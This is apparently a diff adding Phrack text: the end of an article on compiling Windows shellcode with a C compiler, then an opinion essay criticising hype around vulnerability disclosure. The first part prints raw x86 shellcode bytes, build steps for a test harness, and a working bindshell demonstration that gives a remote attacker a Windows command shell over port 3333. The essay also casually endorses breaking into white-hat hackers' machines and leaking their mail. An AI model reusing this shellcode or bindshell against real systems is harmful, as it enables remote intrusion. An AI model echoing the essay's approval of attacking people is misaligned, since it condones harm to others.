+    0x8D,0x7B,0x20,0x0F,0x46,0xDF,0x29,0xD8,0x75,0x0D,0x66,0x85,
+    0xC9,0x74,0x08,0x42,0x39,0x55,0x10,0x75,0xC0,0x31,0xC0,0x5A,
+    0x5B,0x5E,0x5F,0x5D,0xC3,0x55,0x31,0xD2,0x89,0xE5,0x53,0x8B,
+    0x45,0x08,0x8B,0x5D,0x0C,0x8A,0x0C,0x10,0x0F,0xBE,0x1C,0x13,
+    0x42,0x0F,0xBE,0xC1,0x29,0xD8,0x75,0x04,0x84,0xC9,0x75,0xE7,
+    0x5B,0x5D,0xC3,0x55,0x89,0xE5,0x8B,0x55,0x08,0x89,0xD0,0x80,
+    0x38,0x00,0x74,0x03,0x40,0xEB,0xF8,0x29,0xD0,0x5D,0xC3,0x90,
+    0x55,0x89,0xE5,0x57,0x56,0x53,0x83,0xEC,0x1C,0x8B,0x75,0x08,
+    0x64,0xA1,0x30,0x00,0x00,0x00,0x8B,0x40,0x0C,0x8B,0x58,0x0C,
+    0x8D,0x78,0x0C,0x39,0xFB,0x74,0x28,0x89,0x34,0x24,0xE8,0xC4,
+    0xFF,0xFF,0xFF,0x8B,0x53,0x30,0x89,0x74,0x24,0x04,0x89,0x14,
+    0x24,0x89,0x44,0x24,0x08,0xE8,0x36,0xFF,0xFF,0xFF,0x85,0xC0,
+    0x75,0x05,0x8B,0x43,0x18,0xEB,0x06,0x8B,0x1B,0xEB,0xD4,0x31,
+    0xC0,0x83,0xC4,0x1C,0x5B,0x5E,0x5F,0x5D,0xC3,0x55,0x89,0xE5,
+    0x57,0x56,0x53,0x83,0xEC,0x2C,0x8B,0x5D,0x08,0x8B,0x43,0x3C,
+    0x01,0xD8,0x8B,0x70,0x78,0x01,0xDE,0x83,0x78,0x7C,0x00,0x75,
+    0x04,0x31,0xC0,0xEB,0x63,0x83,0x7E,0x14,0x00,0x74,0xF6,0x83,
+    0x7E,0x18,0x00,0x74,0xF0,0x8B,0x46,0x20,0x31,0xD2,0x8B,0x4E,
+    0x1C,0x01,0xD8,0x89,0x45,0xE4,0x8B,0x46,0x24,0x01,0xD8,0x89,
+    0x45,0xE0,0x8D,0x3C,0x12,0x03,0x7D,0xE0,0x3B,0x56,0x18,0x73,
+    0xD0,0x89,0x4D,0xD8,0x8B,0x4D,0xE4,0x89,0x55,0xDC,0x8B,0x04,
+    0x91,0x01,0xD8,0x89,0x44,0x24,0x04,0x8B,0x45,0x0C,0x89,0x04,
+    0x24,0xE8,0x0F,0xFF,0xFF,0xFF,0x8B,0x55,0xDC,0x8B,0x4D,0xD8,
+    0x85,0xC0,0x75,0x0D,0x0F,0xB7,0x07,0x8D,0x04,0x83,0x03,0x1C,
+    0x08,0x89,0xD8,0xEB,0x03,0x42,0xEB,0xBE,0x83,0xC4,0x2C,0x5B,
+    0x5E,0x5F,0x5D,0xC3
+    };
+
+And now to demonstrate running the test harness:
+
+    $ python extract.py --testharness runcalc.exe > runcalc_testharness.c
+    $ i686-w64-mingw32-gcc -fno-toplevel-reorder -falign-functions=1 \
+          -Os -o runcalc_testharness.exe runcalc_testharness.c
+
+On the windows machine:
+
+    C:\phrack\src>runcalc_testharness.exe
+    jumping to shellcode @ 00020000
+    done
+    C:\phrack\src>tasklist | findstr calc
+    calc.exe                      5720 Console                    1     
+    14,244 K
+
+--[ Bindshell example
+
+The following is a demonstration of a quick windows bindshell. Consult the
+source code for the implementation.
+
+On the linux compiler:
+
+    $ i686-w64-mingw32-gcc -fno-toplevel-reorder -falign-functions=1 \
+             -Os -o bindshell.exe bindshell.c common.c pe.c
+    $ python extract.py --testharness bindshell.exe > \
+             bindshell_testharness.c
+    $ i686-w64-mingw32-gcc -fno-toplevel-reorder -falign-functions=1 \
+             -Os -o bindshell_testharness.exe bindshell_testharness.c
+
+On the windows machine:
+
+    C:\phrack\src>bindshell_testharness.exe
+    jumping to shellcode @ 00020000
+
+Attacker:
+
+    $ telnet 192.168.204.144 3333
+    Trying 192.168.204.144...
+    Connected to 192.168.204.144.
+    Escape character is '^]'.
+    Microsoft Windows [Version 10.0.10240]
+    (c) 2015 Microsoft Corporation. All rights reserved.
+
+    C:\phrack\src>ver
+    ver
+
+    Microsoft Windows [Version 10.0.10240]
+
+    C:\phrack\src>whoami
+    whoami
+    win10-vm\user
+
+    C:\phrack\src>exit
+    exit
+    Connection closed by foreign host.
+
+
+--[ Conclusion
+
+Hopefully this humble paper showed that its super easy to generate
+shellcode with a C compiler and that you don't have to use an assembler.
+Obviously assembly language development and understanding are still
+essential skills for a modern exploit developer. However, using the
+techniques presented in this paper should limit the times when
+hand-written assembly code is required to a few specific cases.
+
+--[ References
+
+1. http://www.mingw.org/
+2. https://github.com/erocarrera/pefile
+3. https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html
+4. https://msdn.microsoft.com/en-us/library/00kh39zz.aspx
+
+--[ Appendix: Source code
+
+|=[ 0x07 ]=---=[ Resisting the Hy(p|v)e - anon & anon ]=-----------------=|
+
+
+|=-----------------------------------------------------------------------=|
+|=---------------------=[ Resisting the Hy(p|v)e ]=----------------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------------------=[ anon & anon ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Contents
+
+
+  1 - Prelude
+  2 - The Common Good
+   2.1 - Responsible Disclosure
+   2.2 - White Knights / Self-Claimed Saviors
+  3 - Financial Stability
+  4 - Fame
+  5 - The Underground Spirit
+   5.1 - Hacker By Conviction
+    5.1.1 - Jailbreaks
+    5.1.2 - Freeing Documents
+  6 - Black Hat Stuff
+  7 - Conclusion
+
+
+
+                             ___________
+                            /-/_"/-/_/-/|   +----------------------+
+                           /"-/-_"/-_//||  /| Disclosure is futile |
+                          /__________/|/|-/ +----------------------+
+                          |"|_'='-]:+|/||
+                          |-+-|.|_'-"||//
+                          |[".[:!+-'=|//
+                          |='!+|-:]|-|/
+                           ----------
+
+
+--[ 1 - Prelude
+
+When did all that get started..? Quite a while ago, being a hacker was not
+something you'd have hawked around. Finding bugs, practicing offensive
+techniques, writing cool exploits and last but not least pwning boxes was
+an underground thing you didn't talk about very much. And it still is! The
+hacking underground has not magically disappeared; but now there's also a
+very publicly visible hacking scene. Besides 31337 underground h4xx0rs, we
+now have serious security researchers and consultants, who aim to improve
+the world by finding bugs and disclosing them in a responsible manner. And
+of course the idea of improving something is not a negative thing in
+itself.. Wouldn't you agree?
+
+Things are rarely as easy as they seem, so let's try to explore the
+situation. What happens nowadays can be described by the following example:
+researcher X finds a bug in some widely-used product. Now X communicates
+this bug to the vendor, asking them to come up with a fix. After the vendor
+released a fix, X publicly discloses the bug. This is what "responsible"
+disclosure is roughly about. And this is generally not a bad approach. But
+what X now does is to come up with a scary-sounding name and an ugly logo
+for the vulnerability. Yeah, a cool vuln needs a name and a logo! And of
+course it also needs press attention! But you know, X only takes the burden
+of doing all that because X wants to world to be a safer place. This is why
+X discloses responsibly and also why X needs all that press hype: users
+must be made aware of the problem! And while saving the world, X of course
+also enjoys the publicity, the press attention and the free b00ze at
+conferences. All this (modulo the b00ze, maybe) also contributes to X's job
+security and so it's a win-win situation.
+
+Now we're getting more to the gist of the matter, but let's yet dig a bit
+deeper. The motivation of overhyping bugs and designing shitty logos
+appears to be three-fold: the common good, job security (== financial
+stability) and a little bit of fame, too. Let us look at each of these
+individually.
+
+--[ 2 - The Common Good
+
+Believe it or not, there are actually people who want to improve the world,
+want to do something for the common good. And at the first glance, it might
+even seem that finding and disclosing bugs actually contributes to a safer
+world. It does insofar as a fixed bug cannot be exploited by attackers
+anymore. Now, auditing all code, finding, disclosing and fixing all
+existing bugs is obviously not the way a sane person would recommend for
+fixing the sorry state of our security: First of all, there are way too
+many potential vulnerabilities, even in widely-used, well-audited software
+packages out there. Furthermore, it's not like you can snapshot the world
+today, remove all vulnerabilities and run this stable snapshot until the
+end of time. New bugs will be introduced if we stick to our broken
+engineering processes. So, how much will finding, disclosing and fixing
+individual bugs really contribute to our security? Little. And I can
+already hear you saying: "better contribute little than nothing at all!" .
+This however implies that you only have two options, which is far off from
+the truth. In reality, we have quite a number of effective options for
+improving our security. What about defense efforts? What about safe
+programming languages? (More) secure operating systems? What about teaching
+users how to apply crypto effectively? There's an almost endless list of
+effective improvements one could make. Now if you take into account that
+there's quite a number of things that will really improve our security,
+"doing it for the common good" doesn't appear to be such a good reason
+anymore. Contributing to a safer world is only a negligible side-effect of
+our hacking. So stop deceiving yourself! You're not taking the hard burden
+of hacking just so that the world can be a little bit better. Fucking stop
+lying to yourself!
+
+----[ 2.1 - Responsible Disclosure
+
+   ___________________________________________
+  /  _\                                       \
+  \ (_/_______________________________________/
+   \                                         \
+    \ You're in a desert, walking along in    \ 
+     \  the sand when all of a sudden you look \
+    __\  down and see an 0day.                  \
+   / )_\                      You drop it on FD. \
+   \___/_________________________________________/
+
+
+If you still want to play the game of vuln hunting and disclosure you
+should practice "Responsible Disclosure" they say. Come on, be one of the
+good whitehat guys! But what does the ideal Responsible Disclosure look
+like? Well actually that is pretty straight forward:
+
+   * The Researcher (also note the term "Researcher" instead of "Hacker"
+     whee science!!) finds a terrible security flaw in some product.
+   * The flaw is reported by PGP encrypted email to security@$vendor.com.
+   * The vendor acknowledges the report and starts investigating the issue.
+   * Some time later a fix is implemented by the vendor and patches are
+     shipped.
+   * An entry on http://vendor.com/security.html is created, and the vendor
+     credits and thanks the Researcher for finding the flaw.
+   * After some grace period so that the users can actually apply the patch
+     the Researcher might publish the details of this awkward flaw.
+
+Wow that's simple, and so responsible! Now let's see how this scheme is
+flawed in actual "responsible" disclosure. There are a magnitude of points
+where this simple scheme might fuck up. Just imagine the following
+*absolutely hypothetical* but yet not out of this world scenario:
+
+Researcher Y works at a security company which happens to sell security
+(a.k.a. snakeoil) products to protect their innocent customers from bad
+0day. In order to protect from 0day there needs to be 0day in the wild, so
+researcher Y finds this awesome Internet-ending flaw in a widely used
+software product. Next up the process described above is started by Good
+Guy Y. Also Y decides to present his elite research at BlackHat. So it
+goes... BlackHat is close, and the Logo & Marketing campaign is ready. But
+no vendor patch is available yet. Now ask yourself: what would you do in
+this situation?
+
+Practicing Responsible Disclosure vs. practicing Full Disclosure is sure a
+matter of taste. And as long as you really feel that by responsibly
+disclosing a vulnerability you can do something good, please go ahead and
+do it. However, being responsible doesn't mean that you actually have to
+disclose. You could also just keep the bug for a while (until either the
+vendor fixed it or you pwn3d enough boxes). There's a huge controversy
+about what form of disclosure is best. We'd like to encourage you to find
+that out for yourself, for the particular situation you're in, with the
+particular bug you just found. As long as it's your own decision (and not
+decided by your marketing department or the Hyve conciousness^W^Wguys on
+Twitter), it's probably OK.
+
+----[ 2.2 - White Knights / Self-Claimed Saviors
+
+Let's take a small detour here and have a look at what "hacking for the
+common good" can lead to. Let's start with a real interesting example -
+Project Zero.  There are many possible explanations of what the real reason
+behind p0 might be. We don't want to drift off into conspiracy theories
+here. But as a matter of fact, p0 claims that their goal is to protect
+people [3]. The common good. Being the current leader of the mobile OS
+market [4], it's quite obvious what one would do in order to really protect
+people: fucking audit and harden Android. But interestingly, p0 seems
+rather to be about dropping 0day on Apple and other competitors of Google.
+And the worst thing about that is that there are actual skilled and
+well-respected hackers, being part of the p0 team, paid by Google for doing
+offensive research. And Google even claims moral superiority because, you
+know, at Google we "do no evil" . And possibly, at least some of the p0
+team members even actually believe they do something for the common good.
+This is the most disturbing part about the story. Somehow Google managed to
+sufficiently incentivize these hackers to drop bugs on Google's
+competitors. Other reasons to work for Google obviously include financial
+stability (working for a big corporation) or plainly the money itself. But
+let's stick with the aspect of doing something beneficial for the world.
+Google managed to buy some of the best hackers we know of. One could now of
+course argue that in this special case, letting these hackers "do the right
+thing" prevents them from doing bad things. This is related to the central
+argument that if p0 goes for high-profile bugs and kills them, then
+attackers have to invest significantly more effort if they want to "do bad
+things" - and clearly, raising the attackers' effort is good. This
+reasoning sheds an interesting light on Google's arrogance. The first part,
+of the argument is based on the assumption that Google is actually capable
+of finding a significant share of all attacker-relevant bugs. This alone is
+questionable, but lacking reliable statistics, we cannot directly prove the
+opposite. We however assume that our readers know by first-hand experience,
+what bugs p0 did not kill yet ;) Let's look at the second part of the
+argument: raising the attackers' effort is a good thing. Just for the sake
+of analyzing the argument, let's pretend that we actually wanted do all the
+white-hat stuff (destroy the black market, make everything safer, safe the
+whales etc.). The arrogance of the second part of the argument now lies in
+the idea that Google actually knows how to fight all the evil in the world.
+And their recipe is simple: just make it harder for the bad guys. This
+indicates quite a lack of understanding how complex certain social
+structures can be. We don't want to claim we fully understand these either
+- by no means. But isn't it possible that instead of killing the evil
+  underground, p0 actually strengthens the black market? That talented
+black hats now raise the prices for their sploits and that because of the
+better money you can earn, now even more hackers decide to go the black hat
+way?  Maybe even up to the point where the bad guys are paid better than
+the good guys at Google? Will those then change sides as well or did Google
+manage to brain-wash them enough, using their nanoprobes? Think about the
+war on drugs, about alcohol prohibition, about banning porn.. All these
+followed very simple ideas that in the end showed to be completely
+incompatible with the way society works.
+
+      ---~~~=== Shouts to p0 for raising the market value ===~~~---
+
+        XXXXXXXXXXXXXXXXX GOOGLE RESERVE 0DAY XXXXXXXXXXXXXXXXXXX
+        XXX  XX       THE UNITED STATES OF INTERNET       XXX  XX
+        XXXX XX  -------       ------------               XXXX XX
+        XXXX XX              /              \      P0-FU  XXXX XX
+        XXXXXX     OOO      /          zero  \      ---    XXXXXX
+        XXXXX     OOOOO     | ___            |       __     XXXXX
+        XXX        OOO      ||   \ __ _ _  _ |      OOOO      XXX
+        XXX                 || |) / _` | || ||     OOOOOO     XXX
+        XXX     P0-31337    ||___/\__,_|\_, ||      OOOO      XXX
+        XXX                 |           |__/ |       --       XXX
+        XXX      -------    \                /                XXX
+        X  XX                \ ____________ /               X  XX
+        XX XXX  _________        --------  ___   _______   XXX XX
+        XX XXX            ___  ONE DEAD BUG                XXX XX
+        XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+        
+There is a less severe form of this behavior: telling others what to do
+with their 0day. This commonly happens on Twitter nowadays: "Did you
+contact the vendor? No? How irresponsible!!11" . WTF? These people really
+seem to believe they are morally superior. But what they fail to see is:
+First of all, it's not their bug and so nobody actually asked them what to
+do with it. Second, they should be happy that the person in question
+disclosed the bug at all. Nobody is obliged to do that. But then again, who
+takes people on Twitter serious.
+
+--[ 3 - Financial Stability
+
+We're all getting older. And while this inevitably happens, some develop a
+need for financial stability. This is well-studied [2] and we don't feel
+like we want to go into great detail here. But branding vulnerabilities
+with names and logos is a great way to obtain media attention. And media
+attention can directly influence your job security - "yeah we need to hire
+that guy, that's the one with the mad skills!" As a matter of fact, this is
+how the industry works nowadays and writing this paper won't change it.
+It's also not so much the scope of this article to criticize society and
+capitalism. So if you find that you really want financial stability, think
+about what you do and how you do it. You want job security? Great. But do
+you really have to over-hype your own (or worse: other peoples') bugs in
+order to get your 1-week press attention? Do you want to be hired based on
+the logo of your bug or do you want to be hired for your technical
+expertise? There are not too many skilled hackers anyway, so do you really
+have to be part of all that hype just to single yourself out?
+
+Don't be part of that circus! Yes, other people do it, but you don't have
+to. Think about what type of society you create by joining that goddamn
+show. A society where skill counts less than appearance, where logos are
+better than r00t shells. It is your fucking responsibility to not support
+these clowns. If you really want to do something for the common good, then
+start at this point.
+
+--[ 4 - Fame
+
+Many people strive for fame - be it globally or in their peer-group.
+Hackers are no exception here - and tbh, a little bit of acknowledgement
+actually does feel good. But while you try to get your attention, think
+about whom you want to get it from and what you want to get it for. Do you
+really want to get fame for a technical achievement (such as a cool
+exploit), from people who don't even understand the basics behind it? Or
+worse, do you want fame for something that is actually pretty lame but
+people fail to realize that? If that's what you're after, then please do
+straight ahead with your logo-branded vulnerability whitehat responsible
+disclosure press attention shit. If you want your fame only from your
+peer-group then stay there, that's fine. And if you really want to impress
+the broad masses, then please do something that is actual beneficial for
+the broad masses - exploiting individual bugs isn't. It appears to us that
+some people also try to compensate for problems in their life by
+accumulating fame. We don't want to dive into the emo^Wpsychology thing
+here, but next time you feel the inner desire to impress random people with
+random things, you might want to double-check your reasons.
+
+--[ 5 - The Underground Spirit
+
+This is probably what makes most of us tick. The thirst for knowledge. The
+infinitely many ways of combining and (ab)using technology. The thrill of
+finding a bug, the kick when you see uid 0. This thrill of hacking can
+really become addictive (this is an observation Halvar Flake described very
+nicely in [1]). It's neither good nor bad - neither particularly useful in
+itself nor is it a waste of time. Hacking is one of the many ways humans
+express themselves, their mental power. Others prefer maths, music, writing
+or other arts. There is not much to say about the spirit itself in the
+context of this ranty paper.
+
+----[ 5.1 - Hacker By Conviction
+
+Not everybody sees hacking as a self purpose. There are a number of hackers
+out there who follow certain ideals - free access to information is a
+particularly popular one. And occasionally, one or more of these hackers
+make a real break-through. There are way too many achievements to be named
+here. However, we'd like to highlight the incentives behind a couple of
+randomly chosen popular hacks. And we'd like to do this because not
+everything is what it seems to be. Even if we rant about logo-branded
+vulnerabilities, attention-whores, the press, p0 and whatnot.
+
+
+       The drug                .--.          
+         that makes   ,-.------+-.|  ,-.     
+             ,--=======* )"("")===)===* )    
+             o        `-"---==-+-"|  `-"     
+             0day   us tick    '--'       
+                                              
+
+------[ 5.1.1 - Jailbreaks
+
+The right to use a device that you bought from your own money in whatever
+fucking way you like to (yes, that includes shoving it up your ass) as long
+as you don't harm anybody is something that should be universal.
+Unfortunately, self-claimed saviors like Apple tend to have a different
+view on that topic. If they were to decide, they'd use their arrogant and
+flawed quick-and-dirty patches to make the world sooo much better. That is:
+ban porn, ban drugs, ban fucking curse words, give your boss access to your
+private photo stream and whatever else comes to their mind. Fortunately,
+there are people who are not willing to accept this kind of behavior. Under
+this point of view, jailbreaks are an actual improvement to your freedom.
+Yes, this actually is hacking for the common good. And yes, in the
+jailbreaking scene there are people who do it (partially) for fame or
+money. But the good cause is still clearly visible.
+
+------[ 5.1.2 - Freeing Documents
+
+We don't want to start the Wikileaks vs. politics flamewar here. But we
+still feel that the positive effect of freeing government documents is
+remarkable. People actually take personal risks while trying to provide
+leaked documents. Of course, these people are not necessarily motivated
+*only* by wanting to contribute to a better society. But this is not the
+relevant point: they do something that mankind benefits from. And this
+benefit is clearly visible.
+
+--[ 6 - Black Hat Stuff
+
+There is not too much to say here. Just as in the vulnerability circus, the
+black hat scene offers different incentives for different people. Fame and
+money do play a role - hacking for a common good not so much. Another
+motivation for staying in the underground can be the desire to isolate
+oneself from the clowns in the vulnerability circus. This can lead to
+rather extreme forms, such as pwning and rming white-hack hackers' boxes,
+exposing them in underground zines, making their mail spools public.. You
+get the idea :) You should find your own judgement when it comes to this
+kind of things.
+
+--[ 7 - Conclusion
+
+You might have observed the little stack we built in this article. It all
+originates from the underground spirit. For the one it goes down to the
+black hat stuff (and way deeper, but we'll save this for another article),
+for the others it goes up, from the underground spirit to getting fame,
+from getting fame to obtaining financial stability and from financial
+stability to really believing one does things for the common good, thereby
+finally deceiving yourself and becoming one of the clowns in the
+vulnerability circus. No matter what you do: think about your incentives
+and about your goals. Think about why you do what you do and who might
+benefit from that. And then be honest to yourself and check that what
+you're doing is what you actually wanted.
+
+So is hunting 1337 bugs actually a bad thing? Not at all! Disclosure? No!
+Doing it for money? Neither. Do whatever you want to do, but think about
+your incentives! And maybe the next time you justify your behavior by
+claiming to contribute to the common good, by believing you need to do it
+for the money or by thinking you need the fame, sit back and think about
+that for a second - try to identify the real reasons for what you're doing.
+
+And this is it. We don't want to encourage any particular kind of moral
+behavior. You should be old enough to find that for yourself. We just want
+you to be honest to yourself, to act consciously. Wherever in the
+over-simplified stack we have just shown you think you are.
+
+Yours sincerely, anonymous coward(s)
+794384322cdb45fe41369731e3b8ff74b52beef5
+
+--[ References
+
+[1] http://www.isaca.org/chapters2/Norway/NordicConference/Documents/14.pdf
+[2] Abraham Maslow: A Theory of Human Motivation
+[3] https://cansecwest.com/slides/2015/
+    Project%20Zero%20-%20making%200day%20hard%20-%20Ben%20Hawkes.pdf
+[4] http://www.idc.com/prodserv/smartphone-os-market-share.jsp
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
